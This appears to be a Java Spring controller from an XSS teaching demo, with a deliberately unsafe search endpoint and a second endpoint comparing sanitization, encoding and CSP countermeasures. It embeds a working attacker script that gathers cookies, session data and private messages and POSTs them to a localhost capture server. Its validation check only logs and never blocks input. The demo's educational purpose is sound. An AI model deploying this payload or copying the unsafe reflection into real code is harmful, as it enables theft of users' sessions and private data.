package com.xssdemo;

import org.jsoup.Jsoup;
import org.jsoup.safety.Safelist;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.util.HtmlUtils;

@Controller
public class SearchController {

    @GetMapping("/searchUnsecure")
    public String searchUnsecure(@RequestParam(name="query", required=false, defaultValue="") String query, Model model) {
        model.addAttribute("query", query);
        return "searchUnsecure";
    }
    
    @GetMapping("/searchSecure")
    public String searchSecure(@RequestParam(name="query", required=false, defaultValue="") String query,
    		@RequestParam(name="countermeasure", required=false, defaultValue="") String countermeasure, Model model) {
    	
    	 String originalQuery = query;
         String sanitizedQuery = query;
         
         switch (countermeasure) {
             case "sanitization":
             	// Input Validation
		         if (!isValidQuery(query)) {
		              System.out.println("Invalid Query");
		         }
                 sanitizedQuery = Jsoup.clean(query, Safelist.none());
                 break;
             case "encoding":
                 // Output Encoding
                 sanitizedQuery = HtmlUtils.htmlEscape(query);
                 break;
             case "csp":
                 // Content Security Policy - No change needed here, handled by security config
                 break;
             default:
                 // No countermeasure
                 break;
         }
         
         model.addAttribute("originalQuery", originalQuery);
         model.addAttribute("sanitizedQuery", sanitizedQuery);
         model.addAttribute("countermeasure", countermeasure);
         
         // Add the attacker's script for demonstration
         String attackerScript = 
             "<script>\n" +
             "document.addEventListener('DOMContentLoaded', function() {\n" +
             "    const profileCards = Array.from(document.querySelectorAll('.profile-card')).map(card => ({\n" +
             "        name: card.querySelector('h2').textContent,\n" +
             "        details: Array.from(card.querySelectorAll('p')).map(p => p.textContent)\n" +
             "    }));\n" +
             "    const stolen = {\n" +
             "        searchData: profileCards,\n" +
             "        session: userSession,\n" +
             "        messages: privateMessages,\n" +
             "        cookies: document.cookie,\n" +
             "        userAgent: navigator.userAgent\n" +
             "    };\n" +
             "    \n" +
             "    fetch('http://localhost:8081/capture-data', {\n" +
             "        method: 'POST',\n" +
             "        headers: {\n" +
             "            'Content-Type': 'application/json',\n" +
             "        },\n" +
             "        body: JSON.stringify({data: JSON.stringify(stolen, null, 2)})\n" +
             "    })\n" +
             "    .then(response => response.text())\n" +
             "    .then(result => {\n" +
             "        console.log('Data captured:', result);\n" +
             "    })\n" +
             "    .catch(error => console.error('Error:', error));\n" +
             "});\n" +
             "</script>";
         
        model.addAttribute("attackerScript", attackerScript);
         
        return "searchSecure";
    }
    
    private boolean isValidQuery(String query) {
        // Allow only alphanumeric and space characters
        return query.matches("^[a-zA-Z0-9 ]+$");
    }
}